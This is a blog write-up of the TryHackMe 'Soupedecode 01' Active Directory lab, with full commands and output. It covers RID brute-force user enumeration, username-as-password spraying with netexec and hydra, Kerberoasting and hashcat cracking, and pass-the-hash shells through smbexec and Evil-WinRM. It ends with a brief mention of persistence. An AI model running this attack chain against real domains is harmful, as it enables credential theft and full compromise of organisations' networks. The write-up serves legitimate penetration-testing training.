---
layout: post
title: "TryHackMe - Soupedecode 01"
date: 2025-10-05 10:00:00 -0000
categories: thm
excerpt: "Enumerating users using RID brute force, Dictionary password attacks, Kerberoasting, and Passing the hash."
featured_image: "/assets/images/thm-soupedecode01/thm-soupedecode01-hero.jpg"
---

> Eastern American Red Fox (Vulpes vulpes ssp. fulvus) observed in Algonquin Provincial Park, Ontario on January 2017. Joanne Redwood https://www.inaturalist.org/photos/6568101

## Overview

This TryHackMe challenge demonstrates a complete Active Directory penetration testing workflow, progressing from initial enumeration to domain compromise through credential harvesting and lateral movement techniques.

## Attack Methodology Outline

### Phase 1: Initial Enumeration
1. **User Discovery via RID Brute Force**
   - Use multiple tools (netexec, impacket, enum4linux-ng) to enumerate domain users
   - Extract usernames from domain controllers using anonymous access
   - Build comprehensive user lists for further attacks

### Phase 2: Credential Discovery
2. **Dictionary Password Attacks**
   - Perform dictionary attack against discovered user accounts
   - Use common username/password combinations
   - Validate credentials through LDAP and SMB protocols

### Phase 3: Domain Reconnaissance
3. **Share Enumeration**
   - Map accessible SMB shares using valid credentials
   - Access sensitive files and directories
   - Gather additional user information through SAMR protocol (optional)

### Phase 4: Service Account Exploitation
4. **Kerberoasting Attack**
   - Identify service accounts with Service Principal Names (SPNs)
   - Request Kerberos tickets for service accounts
   - Crack ticket hashes to recover service account passwords

### Phase 5: Privilege Escalation
5. **Hash Extraction and Pass-the-Hash**
   - Extract NTLM hashes from compromised systems
   - Use pass-the-hash techniques to move laterally
   - Gain administrative access to target systems

### Phase 6: System Access
6. **Remote Shell Access**
   - Establish interactive shells using extracted credentials
   - Use tools like smbexec and Evil-WinRM for persistence
   - Complete domain compromise

---

## Technical Implementation

# Phase 1: Initial Enumeration

**What is RID Brute Force?**  

RID (Relative Identifier) brute force is a technique used to enumerate user accounts in Windows domains. Every user and group in a Windows domain has a unique Security Identifier (SID) that ends with a RID (Relative ID) number. By systematically querying sequential RID values (typically starting from 500), attackers can discover valid usernames even when other enumeration methods are restricted. This works because Windows systems will return user information when queried with a valid RID, making it an effective reconnaissance technique against Active Directory environments.

We need to enumerate users, we can guess at usernames or we can use a tool to brute force usernames using their RIDs.

### Netexec - Enumerate usernames using RID brute force
We can use `NetExec` to brute force the usernames of the domain.
```bash
netexec smb X.X.X.X -u anonymous -p '' --users --rid-brute | tee netexec-enum-users.txt
```

This will return something like
```
SMB                      X.X.X.X    445    DC01             2019: SOUPEDECODE\squincy951 (SidTypeUser)
SMB                      X.X.X.X    445    DC01             2020: SOUPEDECODE\qursula952 (SidTypeUser)
SMB                      X.X.X.X    445    DC01             2021: SOUPEDECODE\akevin953 (SidTypeUser)
SMB                      X.X.X.X    445    DC01             2022: SOUPEDECODE\yquinn954 (SidTypeUser)
SMB                      X.X.X.X    445    DC01             2023: SOUPEDECODE\padam955 (SidTypeUser)
SMB                      X.X.X.X    445    DC01             2024: SOUPEDECODE\pgrace956 (SidTypeUser)
```

We want to make a list of usernames, so we're most interested in the 6th column
Let's display the 6th column of the file only using `awk`
```bash
awk '{print $6}' netexec-enum-users.txt
```

This returns something like DOMAIN\username
```
SOUPEDECODE\asean958
SOUPEDECODE\zmegan959
SOUPEDECODE\syusuf960
SOUPEDECODE\tfaith961
SOUPEDECODE\nquinn962
```

This output is perfect for using `hydra` to brute force passwords, so lets save this output to use later
```bash
awk '{print $6}' netexec-enum-users.txt > domain-usernames.txt
```

We can also create a list of just the usernames by using `sed`. This can come in handy if we want to use `NetExec` or `hydra` to brute force the passwords.
```bash
awk '{print $6}' enum-users.txt | sed 's/SOUPEDECODE\\//' > usernames.txt
```

This gives us something like
```
tgrace989
uquinn990
xursula991
ojudy992
lhelen993
```

### Impacket - Enumerate usernames using RID brute force
An alternative tool to `NetExec` for brute forcing username RIDs is using Impacket's `lookupsid.py`

```bash
python3 lookupsid.py anonymous@X.X.X.X -no-pass
```

Which will give output like
```
1172: SOUPEDECODE\zcolin69 (SidTypeUser)
1173: SOUPEDECODE\wzane70 (SidTypeUser)
1174: SOUPEDECODE\poscar71 (SidTypeUser)
1175: SOUPEDECODE\walice72 (SidTypeUser)
1176: SOUPEDECODE\gvera73 (SidTypeUser)
```

Use `sed` and `awk` to parse output to your liking

### enum4linux-ng - Enumerate usernames
Once we have a list of usernames we could potentially enumerate which users have "Listing" access to shares. This will take a while, I list it more for proof of concept and to show another tool. Search output for "Listing: OK" when complete

```bash
while read user; do
  enum4linux-ng -u "$user" -p '' X.X.X.X -S >> enum-users-enum4linux.txt
done < usernames.txt
```

# Phase 2: Credential Discovery

**Password dictionary attack with wordlists**  

Password brute forcing involves systematically testing username/password combinations against authentication services. Instead of trying random passwords, we use curated wordlists containing common passwords, leaked credentials, and password patterns. This approach is more efficient than pure brute force since it targets passwords that users actually choose. Tools like `NetExec` and `hydra` can test multiple credentials simultaneously while handling authentication protocols like SMB and LDAP. 

Now that we have a valid list of usernames, we can begin attempting to guess passwords using word lists (in this case, we're going to try looking for accounts where the username is also the password).
Thankfully modern Enterprise AD environments do not allow this by default.

### Netexec - Dictionary attack
```bash
netexec smb X.X.X.X -u usernames.txt -p usernames.txt --continue-on-success --no-brute | tee netexec-dictionary-results.txt
```
The `--continue-on-success` flag ensures we find all valid credentials, not just the first match.

The output of the `NetExec` password attack will look like
```
GON_FAILURE
SMB                      X.X.X.X   445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS_LOGON_FAILURE
SMB                      X.X.X.X   445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS_LOGON_FAILURE
SMB                      X.X.X.X   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB                      X.X.X.X   445    DC01             [-] SOUPEDECODE.LOCAL\file_svc:file_svc STATUS_LOGON_FAILURE
SMB                      X.X.X.X   445    DC01             [-] SOUPEDECODE.LOCAL\charlie:charlie STATUS_LOGON_FAILURE
```

`[+] SOUPEDECODE.LOCAL\<username>:<password>` without `STATUS_LOGON_FAILURE` would indicate a valid login account

We can also use `Hydra` to perform a dictionary attack
### Hydra - Dictionary attack (testing matching username/password pairs)

We read lines from the `domain-usernames.txt` file, we parse the file on the fly providing DOMAIN\\\<username> as the username and the username (no domain) as the password. This is also a good example of using a while loop and and reading from a file using `bash` scripting. `IFS$'\\'` means Input File Seperator and we are using an escaped `\` (the `\` from DOMAIN\<username>)as the seperator.

We pass `ldap3` as the protocol to `hydra` 

```bash
while IFS=$'\\' read domain_user username; do
  echo "Testing: $domain_user with password: $username"
  hydra -l "$domain_user\\$username" -p "$username" X.X.X.X ldap3 >> hydra-dictionary-results.txt
done < domain-usernames.txt
```

Our output would look something like this.  
Look for the green in the terminal output to denote successfull login.
```bash
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-06 02:47:50
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ldap3://X.X.X.X:389/
[389][ldap3] host: X.X.X.X   login: SOUPEDECODE\ybob317   password: ybob317
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-06 02:47:50
Testing: SOUPEDECODE with password: file_svc
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
```

### Hydra - Verify single LDAP creds
We can also test credentials of a single user using `hydra`

```bash
hydra -l <domain>\\<username> -p <password> X.X.X.X ldap3
```

# Phase 3: Domain Reconnaissance

**Domain Reconnaissance**  

With valid domain credentials in hand, we can now perform deeper reconnaissance within the domain environment. We'll enumerate SMB shares to find sensitive files and data repositories, gather detailed user information through SAMR queries, and perform Kerberoasting attacks to identify service accounts with weak passwords. This reconnaissance provides the intelligence needed for privilege escalation and lateral movement.

### Enum4Linux-ng - Enumerate shares
We can use `Enum4Linux-ng` to enumerate information about shares our compromised account has access to
```bash
enum4linux-ng -u '<username>' -p '<password>' X.X.X.X -S
```

The output tells us that our account has "Listing: OK" status for the Users share and this is where one would find potentially sensitive information or something to use for further lateral movement.
```bash
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK
[*] Testing share Users
[+] Mapping: OK, Listing: OK
[*] Testing share backup
[+] Mapping: OK, Listing: DENIED
```

### Netexec - Enumerate shares
One could also use `NetExec` to enumerate shares the user has access to
```bash
netexec smb X.X.X.X -u <username> -p <password> --shares -d <domain>
```  

`NetExec` would give us something like
```bash
SMB         X.X.X.X    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         X.X.X.X    445    DC01             [+] SOUPEDECODE\ybob317:ybob317 
SMB         X.X.X.X    445    DC01             [*] Enumerated shares
SMB         X.X.X.X    445    DC01             Share           Permissions     Remark
SMB         X.X.X.X    445    DC01             -----           -----------     ------
SMB         X.X.X.X    445    DC01             ADMIN$                          Remote Admin
SMB         X.X.X.X    445    DC01             backup                          
SMB         X.X.X.X    445    DC01             C$                              Default share
SMB         X.X.X.X    445    DC01             IPC$            READ            Remote IPC
SMB         X.X.X.X    445    DC01             NETLOGON        READ            Logon server share 
SMB         X.X.X.X    445    DC01             SYSVOL          READ            Logon server share 
SMB         X.X.X.X    445    DC01             Users           READ     
```

### Impacket - Access data in shares
We'll use Impacket's `smbclient.py` to explore the shares.
```bash
smbclient.py <domain>/<username>:<password>@X.X.X.X
```

Once connected, use the command `shares` to list available shares. From our previous output with `Enum4Linux-ng`, we may want to check the "Users" share.

Use the `use` command to acces the "Users" share. There one will find the first flag.

```
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL
Users
# use Users
# ls
drw-rw-rw-          0  Thu Jul  4 22:48:22 2024 .
drw-rw-rw-          0  Wed Jun 18 22:14:47 2025 ..
drw-rw-rw-          0  Thu Jul  4 22:49:01 2024 admin
drw-rw-rw-          0  Fri Jul 25 17:45:10 2025 Administrator
drw-rw-rw-          0  Sun Jun 16 03:49:29 2024 All Users
drw-rw-rw-          0  Sun Jun 16 02:51:08 2024 Default
drw-rw-rw-          0  Sun Jun 16 03:49:29 2024 Default User
-rw-rw-rw-        174  Sun Jun 16 03:46:32 2024 desktop.ini
drw-rw-rw-          0  Sat Jun 15 17:54:32 2024 Public
drw-rw-rw-          0  Mon Jun 17 17:24:32 2024 ybob317
# 
```

### Enumerate user info (RID, comments, last logon, etc. YMMV)
If you want to be extra (not necessary for this room, but depending on system it could give visibility into "Comments" on user accounts). YMMV.
```bash
samrdump.py <username>:<password>@X.X.X.X
```

# Phase 4: Service Account Exploitation

**Kerberoasting**  

Kerberoasting is an attack technique that targets service accounts in Active Directory environments. When a service account has a Service Principal Name (SPN) registered, any authenticated domain user can request a Kerberos service ticket (TGS) for that service. These tickets are encrypted with the service account's password hash. Since service accounts often have weak or static passwords, attackers can extract these tickets and perform offline password cracking attacks using tools like hashcat. Successful Kerberoasting can reveal service account passwords, which often have elevated privileges in the domain.

> Having the IP of the domain mapped to the domain name in `/etc/hosts` is importand for Kerberoasting. Having the FQND `DOMAIN.LOCAL` in `/etc/hosts` and the `GetUserSPNs.py` is essential for this to work.

### Impacket - Kerberoast domain using known account cred
```bash
echo "X.X.X.X <domain.local>" >> /etc/hosts

GetUserSPNs.py <domain.local>/<username>:<password> -dc-ip X.X.X.X -target-domain <domain.local> -request -outputfile impacket-roasted.txt
```

Which gives us some service accounts that were roasted.
```
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[!] KDC IP address and hostname will be ignored because of cross-domain targeting.
ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 17:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 17:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 17:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 17:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 17:29:18.511871  <never>               
```

If we look in the output file, we will see hashes for the accounts

### Netexec - Kerberoast domain using known account cred
Same concept, we roast the accounts and receive the NTLM hashes
```bash
echo "X.X.X.X <domain.local>" >> /etc/hosts

netexec ldap X.X.X.X -u <username> -p <password> --kerberoasting netexec-roasted.txt
```

`NetExec` output followed by hashes
```
LDAP        X.X.X.X   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SOUPEDECODE.LOCAL)
LDAP        X.X.X.X   389    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
LDAP        X.X.X.X   389    DC01             [*] Skipping disabled account: krbtgt
LDAP        X.X.X.X   389    DC01             [*] Total of records returned 5
LDAP        X.X.X.X   389    DC01             [*] sAMAccountName: file_svc, memberOf: [], pwdLastSet: 2024-06-17 17:32:23.726085, lastLogon: <never>
LDAP        X.X.X.X   389    DC01    
```

### Hashcat - Crack hashes
Now that we have the krb5tgs hashes, we can atempt to crack them
```bash
hashcat <netexec or impacket>-roasted.txt /usr/share/wordlists/rockyou.txt
hashcat --show -m 13100 <netexec or impacket>-roasted.txt
```

This lets us know that out of the 5 roasted accounts, we were able to crack 1 hash
```bash
Recovered........: 1/5 (20.00%) Digests (total), 1/5 (20.00%) Digests (new), 1/5 (20.00%) Salts
```

Now that we've compromised the credentials of another account (a service account this time), lets see what access we have by enumerating shares using the service account. 

> Note: single quotes are important for the password argument here as they keep special characters from being interpolated by the shell.

### Enum4linux-ng - Enumerate share info
```bash
enum4linux-ng -u '<service account>' -p '<password>' -S X.X.X.X
```

It looks like we have "Listing: OK" access to the "backup" share
```bash
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK
[*] Testing share Users
[+] Mapping: OK, Listing: DENIED
[*] Testing share backup
[+] Mapping: OK, Listing: OK
```

### Impacket - Use smbclient to access shares
```bash
smbclient.py '<domain>/<service account>':'<password>'@X.X.X.X
```

We access the share and download the data
```bash
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL
Users
# use backup
# mget *
[*] Downloading backup_extract.txt
# 
```

# Phase 5: Privilege Escalation

**Pass-the-Hash**  

Pass-the-Hash (PtH) is a lateral movement technique that allows attackers to authenticate to remote systems using NTLM password hashes without needing to crack them first. Instead of requiring the plaintext password, PtH leverages the fact that Windows authentication protocols accept the hash directly. This technique is particularly effective with computer/machine account hashes (accounts ending with `$`) as these often have elevated privileges and access to multiple systems. Tools like `NetExec`, Impacket's `smbexec.py`, and `Evil-WinRM` can use these hashes to authenticate and gain remote access, making PtH a powerful technique for domain compromise and lateral movement.

It appears that the `backup_extract.txt` contains several NTLM hashes for computer/machine accounts in the Username:RID:LM_Hash:NTLM_Hash::: format

```
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::
```

We can use these NTLM hashes for pass the hash lateral movement.

### Use netexec to check hashes
```bash
while IFS=':' read -r user rid lmhash nthash rest; do
  netexec smb X.X.X.X -u "$user" -H "$nthash" -d <domain>
done < backup_extract.txt
```

The `NetExec` output lets us know we have a valid account hash we can use for pass the hash.
```
SMB         X.X.X.X   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         X.X.X.X   445    DC01             [+] SOUPEDECODE\FileServer$:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx (Pwn3d!)
SMB         X.X.X.X   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         X.X.X.X   445    DC01             [-] SOUPEDECODE\MailServer$:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx STATUS_LOGON_FAILURE
```

# Phase 6: System Access

**Remote System Access using Pass-the-Hash**  

With valid NTLM hashes, we can now establish remote interactive sessions using the hashes to authenticate and gain shell access without needing plaintext passwords. Tools like Impacket's `smbexec.py` provide semi-interactive command shells over SMB, while `Evil-WinRM` offers full PowerShell sessions over WinRM protocol. These remote access methods allow us to navigate the file system, execute commands, extract sensitive data, and establish persistence on the target systems.

### Impacket - Launch semi-interactive shell
We can use `smbexec.py` to pass the hash for a semi-interactive shell.
```bash
smbexec.py '<machine account>'@<domain.local> -hashes <lm hash>:<nt hash> -target-ip X.X.X.X
```

In `smbexec.py` semi-interactive shell, pass the path of the folder to view as an argument for the `dir` command. Use `type` to display the contents of a file.
```
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>cd C:\Users
[-] You can't CD under SMBEXEC. Use full paths.
C:\Windows\system32>dir c:\Users
 Volume in drive C has no label.
 Volume Serial Number is CCB5-C4FB

 Directory of c:\Users

10/05/2025  11:04 PM    <DIR>          .
07/04/2024  03:49 PM    <DIR>          admin
10/05/2025  10:30 PM    <DIR>          Administrator
10/05/2025  11:04 PM    <DIR>          FileServer$
06/15/2024  10:54 AM    <DIR>          Public
06/17/2024  10:24 AM    <DIR>          ybob317
               0 File(s)              0 bytes
               6 Dir(s)  43,925,721,088 bytes free

C:\Windows\system32>
C:\Windows\system32>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is CCB5-C4FB

 Directory of C:\Users\Administrator\Desktop

07/25/2025  10:51 AM    <DIR>          .
10/05/2025  10:30 PM    <DIR>          ..
06/17/2024  10:41 AM    <DIR>          backup
07/25/2025  10:51 AM                33 root.txt
               1 File(s)             33 bytes
               3 Dir(s)  43,925,532,672 bytes free

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

C:\Windows\system32>
```

### Evil-WinRM
I prefer `Evil-WinRM` very much over `smbexec.py` for remote terminal sessions.
```bash
evil-winrm -u <machine account> -H <nt hash> -i X.X.X.X
```

Our Evil-WinRM session to recover the final flag
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FileServer$\Documents> ls c:/users


    Directory: C:\users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          7/4/2024   3:49 PM                admin
d-----         10/5/2025  10:30 PM                Administrator
d-----         10/5/2025  11:04 PM                FileServer$
d-r---         6/15/2024  10:54 AM                Public
d-----         6/17/2024  10:24 AM                ybob317


*Evil-WinRM* PS C:\Users\FileServer$\Documents> ls c:/users/administrator/desktop


    Directory: C:\users\administrator\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/17/2024  10:41 AM                backup
-a----         7/25/2025  10:51 AM             33 root.txt


*Evil-WinRM* PS C:\Users\FileServer$\Documents> 
```

At this point, persistance can be setup using Scheduled Tasks, startup applications, registry keys or C2 agent.